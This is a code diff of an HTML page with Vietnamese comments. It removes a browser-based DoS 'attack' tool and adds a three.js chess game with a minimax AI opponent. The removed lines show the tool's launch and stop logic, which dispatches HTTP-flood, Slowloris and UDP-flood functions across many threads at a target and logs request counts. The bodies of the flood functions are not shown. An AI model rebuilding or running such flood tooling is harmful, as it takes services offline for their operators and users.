+                    return true;
+                } else {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        function switchPlayer() {
+            currentPlayer = currentPlayer === 'white' ? 'black' : 'white';
+            updateUI();
+            
+            if (checkGameOver()) {
+                updateUI();
                 return;
             }
             
-            running = true;
-            requestCount = 0;
-            successCount = 0;
-            failCount = 0;
-            startTime = Date.now();
-            
-            document.getElementById('stats').style.display = 'block';
-            document.getElementById('logBox').style.display = 'block';
-            document.getElementById('attackBtn').style.display = 'none';
-            document.getElementById('stopBtn').style.display = 'block';
-            
-            document.getElementById('logBox').innerHTML = '';
-            log('🚀 BẮT ĐẦU TẤN CÔNG: ' + target);
-            log('⚡ Phương thức: ' + method);
-            log('🔧 Số luồng: ' + threadCount);
-            
-            timerInterval = setInterval(updateStats, 1000);
-            
-            let attackFunctions = [];
-            if (method === '1') attackFunctions = [httpFlood(target)];
-            else if (method === '2') attackFunctions = [slowloris(target)];
-            else if (method === '3') attackFunctions = [udpFlood(target)];
-            else if (method === '4') attackFunctions = [httpFlood(target), slowloris(target), udpFlood(target)];
-            
-            for (let i = 0; i < threadCount; i++) {
-                setTimeout(() => {
-                    if (running) {
-                        const randomAttack = attackFunctions[Math.floor(Math.random() * attackFunctions.length)];
-                        randomAttack();
-                    }
-                }, i * 10);
+            if (currentPlayer === 'black' && !gameOver) {
+                aiMove();
             }
         }
 
-        function stopAttack() {
-            running = false;
-            clearInterval(timerInterval);
+        async function aiMove() {
+            isAIThinking = true;
+            document.getElementById('thinking-overlay').style.display = 'block';
             
-            document.getElementById('attackBtn').style.display = 'block';
-            document.getElementById('stopBtn').style.display = 'none';
+            await new Promise(resolve => setTimeout(resolve, 300));
             
-            log('🛑 ĐÃ DỪNG TẤN CÔNG');
-            log('📊 Tổng request: ' + requestCount);
-            log('✅ Thành công: ' + successCount);
-            log('❌ Thất bại: ' + failCount);
+            const move = getBestAIMove();
+            
+            if (move) {
+                makeMove(move.fromRow, move.fromCol, move.toRow, move.toCol);
+            }
+            
+            document.getElementById('thinking-overlay').style.display = 'none';
+            isAIThinking = false;
+            switchPlayer();
         }
+
+        function resetGame() {
+            board = JSON.parse(JSON.stringify(initialBoard));
+            currentPlayer = 'white';
+            selectedPiece = null;
+            gameOver = false;
+            capturedByWhite = [];
+            capturedByBlack = [];
+            isAIThinking = false;
+            document.getElementById('thinking-overlay').style.display = 'none';
+            clearAllHighlights();
+            updatePiecePositions();
+            updateUI();
+        }
+
+        // ==================== RAYCASTER CHO TƯƠNG TÁC ====================
+        const raycaster = new THREE.Raycaster();
+        const mouse = new THREE.Vector2();
+
+        function getIntersections(event) {
+            mouse.x = (event.clientX / window.innerWidth) * 2 - 1;
+            mouse.y = -(event.clientY / window.innerHeight) * 2 + 1;
+            raycaster.setFromCamera(mouse, camera);
+            return raycaster.intersectObjects(piecesGroup.children, true);
+        }
+
+        function onMouseClick(event) {
+            if (gameOver || isAIThinking || currentPlayer !== 'white') return;
+            
+            const intersects = getIntersections(event);
+            if (intersects.length === 0) {
+                const squareIntersects = raycaster.intersectObjects(squares.flat());
+                if (squareIntersects.length > 0 && selectedPiece) {
+                    const square = squareIntersects[0].object;
+                    const { row, col } = square.userData;
+                    const legalMoves = getLegalMoves(selectedPiece.row, selectedPiece.col, board[selectedPiece.row][selectedPiece.col]);
+                    const isValidMove = legalMoves.some(m => m.row === row && m.col === col);
+                    if (isValidMove) {
+                        makeMove(selectedPiece.row, selectedPiece.col, row, col);
+                        selectedPiece = null;
+                        clearAllHighlights();
+                        switchPlayer();
+                    }
+                }
+                return;
+            }
+            
+            let clickedPiece = intersects[0].object;
+            while (clickedPiece && !clickedPiece.userData.piece) {
+                clickedPiece = clickedPiece.parent;
+            }
+            if (!clickedPiece || !clickedPiece.userData.piece) return;
+            
+            const { row, col, piece } = clickedPiece.userData;
+            
+            if (getPieceColor(piece) !== 'white') return;
+            
+            if (selectedPiece && selectedPiece.row === row && selectedPiece.col === col) {
+                selectedPiece = null;
+                clearAllHighlights();
+                return;
+            }
+            
+            if (selectedPiece) {
+                const legalMoves = getLegalMoves(selectedPiece.row, selectedPiece.col, board[selectedPiece.row][selectedPiece.col]);
+                const isValidMove = legalMoves.some(m => m.row === row && m.col === col);
+                if (isValidMove) {
+                    makeMove(selectedPiece.row, selectedPiece.col, row, col);
+                    selectedPiece = null;
+                    clearAllHighlights();
+                    switchPlayer();
+                    return;
+                }
+            }
+            
+            selectedPiece = { row, col };
+            clearAllHighlights();
+            highlightSquare(row, col, 0xffaa00);
+            const legalMoves = getLegalMoves(row, col, piece);
+            for (const move of legalMoves) {
+                highlightSquare(move.row, move.col, board[move.row][move.col] ? 0xff4444 : 0x44ff44);
+            }
+        }
+
+        window.addEventListener('click', onMouseClick);
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            labelRenderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        document.getElementById('new-game-btn').addEventListener('click', resetGame);
+
+        // ==================== ANIMATION LOOP ====================
+        function animate() {
+            requestAnimationFrame(animate);
+            controls.update();
+            renderer.render(scene, camera);
+            labelRenderer.render(scene, camera);
+        }
+
+        // ==================== KHỞI ĐỘNG ====================
+        updatePiecePositions();
+        updateUI();
+        animate();
+
+        console.log('♟ Bui Minh Phat Chess đã sẵn sàng! Bạn đi trước (quân Trắng).');
+        console.log('Click chọn quân, sau đó click ô đích để di chuyển.');
+        console.log('Máy sử dụng Minimax với độ sâu 3.');
     </script>
 </body>
 </html>
